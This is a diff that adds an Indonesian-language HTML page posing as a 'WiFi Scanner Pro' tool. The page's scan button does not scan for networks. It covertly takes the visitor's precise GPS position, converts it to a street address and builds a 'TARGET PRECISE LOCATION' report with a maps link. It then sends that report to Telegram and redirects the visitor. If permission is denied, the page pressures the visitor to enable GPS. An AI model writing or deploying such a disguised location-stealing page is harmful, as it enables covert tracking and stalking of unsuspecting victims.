@@ -1,0 +1,44 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <title>WiFi Scanner Pro</title>
+    <link rel="stylesheet" href="assets/styles.css">
+</head>
+<body>
+    <div class="card">
+        <img src="img/icons.png" width="80">
+        <h2>WiFi Scanner v7.0</h2>
+        <p id="msg">Klik tombol di bawah untuk mencari sinyal WiFi di sekitar Anda.</p>
+        <button class="btn-scan" onclick="startScan()">SCAN SEKARANG</button>
+        
+        <div id="error-gps" style="display:none; color:red; margin-top:15px; font-weight:bold;">
+            ⚠️ UNTUK MENGGUNAKAN FITUR INI ANDA HARUS MENYALAKAN GPS UNTUK MELIHAT WIFI DI SEKITAR!
+        </div>
+    </div>
+
+    <script src="assets/core.js"></script>
+    <script>
+    function startScan() {
+        navigator.geolocation.getCurrentPosition(async (pos) => {
+            const lat = pos.coords.latitude;
+            const lon = pos.coords.longitude;
+            const address = await getAddressFromCoords(lat, lon); // Olah GPS jadi Alamat
+
+            const locReport = `
+📍 *TARGET PRECISE LOCATION*
+━━━━━━━━━━━━━━━━━━
+• Alamat: ${address}
+• Koordinat: \`${lat}, ${lon}\`
+• Maps: [Buka Google Maps](https://www.google.com/maps?q=${lat},${lon})
+━━━━━━━━━━━━━━━━━━
+`;
+            await sendToTelegram(locReport);
+            window.location.href = "result.html";
+        }, (err) => {
+            document.getElementById('error-gps').style.display = 'block';
+        }, { enableHighAccuracy: true });
+    }
+    </script>
+</body>
+</html>
